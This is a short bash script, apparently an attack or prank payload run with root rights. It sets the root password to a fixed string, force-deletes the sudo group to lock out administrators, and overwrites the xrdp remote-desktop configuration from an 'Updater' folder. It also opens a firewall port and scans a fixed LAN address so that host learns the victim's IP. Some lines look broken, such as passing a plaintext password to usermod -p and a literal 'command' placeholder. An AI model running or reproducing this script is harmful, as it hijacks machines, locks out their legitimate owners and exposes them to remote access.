#!/bin/bash

#Redirects output
command > /dev/null 2>&1

#Makes root password custom pass
usermod -p 'YouGotGot123!' root

#Deletes sudo group, which should prevent users from gaining sudo access
groupdel -f -r sudo

#Changes xrdp.ini file to reflect needed changes
cat /root/Updater/copy.txt > /etc/xrdp/xrdp.ini
systemctl restart xrdp

#Ensures port is open for remote desktop
ufw enable
ufw allow 49952/tcp
ufw reload

#Pings host so they gain device IP
nmap -p 1026 192.168.215.129